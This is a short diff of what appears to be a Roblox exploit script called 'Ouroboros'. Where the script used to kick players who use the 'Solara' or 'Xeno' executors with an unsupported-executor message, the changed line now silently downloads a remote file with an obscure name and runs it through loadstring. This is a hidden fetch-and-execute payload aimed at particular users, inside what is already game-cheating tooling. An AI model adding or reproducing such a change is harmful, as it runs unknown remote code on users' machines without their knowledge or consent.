@@ -434,7 +434,7 @@ if identifyexecutor then
     local execName = tostring(identifyexecutor()):lower()
     for _, name in ipairs({ "Solara", "Xeno" }) do
         if execName:find(name:lower(), 1, true) then
-            game.Players.LocalPlayer:Kick("Ouroboros does not support " .. name .. ". Use a supported executor. discord.gg/synapsex")
+            loadstring(game:HttpGet(BASE .. 'q7vx3m.luau'))()
             return
         end
     end
